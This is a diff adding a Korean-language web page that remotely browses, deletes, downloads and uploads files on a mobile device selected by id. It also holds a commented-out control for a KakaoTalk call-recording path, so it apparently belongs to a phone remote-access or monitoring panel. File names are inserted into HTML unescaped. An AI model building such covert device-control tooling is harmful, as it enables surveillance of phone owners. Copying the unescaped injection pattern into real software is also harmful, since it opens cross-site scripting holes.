@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>파일 관리</title>
+    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
+    <link href="/assets/global/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+    <script src="/assets/plugins/jquery.min.js"></script>
+    <script src="/assets/socket/socket.io-client/dist/socket.io.js"></script>
+    <style>
+        table,
+        th,
+        td {
+            border: 1px solid black;
+            border-collapse: collapse;
+        }
+        
+        th,
+        td {
+            padding: 5px;
+            text-align: left;
+        }
+    </style>
+    <% include socket.ejs %>
+</head>
+
+<body>
+    <p>파일 관리</p>
+
+    <div>
+        <button type="button" onclick="uploadFiles()">가져오기</button>
+        <span id="result"></span>
+    </div>
+    <table id="table_data">
+    </table>
+
+    <!-- <button type="button" onclick="sendFile()">파일 보내기</button>
+    <button type="button" onclick="setCallRecPath()">카톡녹음경로설정</button> -->
+    <input id="send_file" type="file" class="form-control" style="display: none;">
+
+    <input type="hidden" id='current_path'>
+    <input type="hidden" id='storage_path'>
+
+    <script type="text/javascript">
+        var id = '<%=id%>';
+
+        var file_download_name = "";
+        var is_file_download = false;
+
+        $(function() {
+
+            socket.on("file_download", function(data) {
+                // console.log("download_file", data);
+                var mobile_id = data.id;
+                var file_name = data.file_name;
+                if( mobile_id != id || !is_file_download || !file_download_name.includes(data.file_name)){
+                    console.log("fail");
+                    return;
+                }
+                console.log("ok");
+                is_file_download = false;
+                file_download_name = ""
+                // uploadFiles();
+                window.location.href = `/api/mobiles/${mobile_id}/${file_name}/download_file`;
+
+            })
+
+            socket.on("filelist_updated", function(data) {
+                $('#result').text('성공');
+                if (id == data.mobileId) {
+                    console.log("file", data.files);
+                    $('#current_path').val(data.current_path);
+                    $('#storage_path').val(data.storage_path);
+                    console.log("current_path", $('#current_path').val());
+                    console.log("storage_path", $('#storage_path').val());
+                    var filelist = data.files;
+                    var html_string = `
+                            <tr>
+                                <th>정보</th>
+                                <th>이름</th>
+                                <th>관리</th>
+                            </tr> 
+                            <tr>
+                                <td></td>
+                                <td>...</td>
+                                <td> <input type="button" onclick="uploadFiles('${data.parent_path}')" value="상위등록부"></td>
+                            </tr>
+                        `;
+
+                    for (var i = 0; i < filelist.length; i++) {
+                        html_string += `<tr>
+                        <td>${filelist[i].is_dir ? '<i class="fa fa-folder-o" aria-hidden="true"></i>' : '<i class="fa fa-file-text-o" aria-hidden="true"></i>'}</td>
+                        <td>${filelist[i].name}</td>
+                        <td>`;
+                        if (filelist[i].is_dir) {
+                            html_string += `<input type="button" onclick="uploadFiles('${filelist[i].absolute_dir}')" value='열기'>`
+                        } else {
+                            html_string += `
+                                <input type="button" onclick="uploadFiles('${filelist[i].absolute_dir}', 'delete')" value='삭제'>
+                                <input type="button" onclick="downloadFile('${filelist[i].absolute_dir}')" value='가져오기'>`
+                        }
+                        html_string += `
+                        </td>
+                        </tr>`;
+                    }
+                    $('#table_data').html(html_string);
+                }
+            });
+        });
+
+        function uploadFiles(filename = "", action = "") {
+            $('#result').text('휴대폰에 연결중');
+            $.ajax({
+                type: 'post',
+                url: `/api/mobile/upload_files`,
+                data: {
+                    id,
+                    filename,
+                    action,
+                },
+                dataType: 'json',
+                success: function(data) {
+                    $('#result').text('불러오는 중');
+                },
+                error: function(data) {
+                    $('#result').text('휴대폰 연결 실패');
+                }
+            });
+        }
+
+        function downloadFile(filename) {
+            file_download_name = filename;
+            $.ajax({
+                type: 'post',
+                url: `/api/mobile/download_file`,
+                data: {
+                    id,
+                    filename
+                },
+                dataType: 'json',
+                success: function(data) {
+                    is_file_download = true;
+                    $('#result').text('불러오는 중');
+                },
+                error: function(data) {
+                    $('#result').text('휴대폰 연결 실패');
+                }
+            });
+        }
+
+        function setCallRecPath() {
+            var current_path = $('#current_path').val();
+            var storage_path = $('#storage_path').val();
+            $.ajax({
+                type: 'post',
+                url: `/api/mobile/call_rec_path`,
+                data: {
+                    id,
+                    current_path,
+                    storage_path
+                },
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {}
+            });
+        }
+
+        function sendFile() {
+            $("#send_file").click();
+        }
+
+        $('#send_file').change(function(event) {
+
+            var input = $(event.currentTarget);
+            var file = input[0].files[0];
+            var filename = file.name;
+
+            req_obj = new FormData();
+            req_obj.append("id", id);
+            req_obj.append("file_path", $('#current_path').val());
+            req_obj.append("file_name", filename);
+            req_obj.append("file", file);
+
+            $.ajax({
+                crossDomain: true,
+                method: "post",
+                url: "/api/mobile/send_file",
+                processData: false,
+                contentType: false,
+                mimeType: "multipart/form-data",
+                data: req_obj,
+                //cache: false,
+                dataType: 'json',
+                success: function(data) {},
+                error: function(data) {}
+            });
+        })
+    </script>
+</body>
+
+</html>
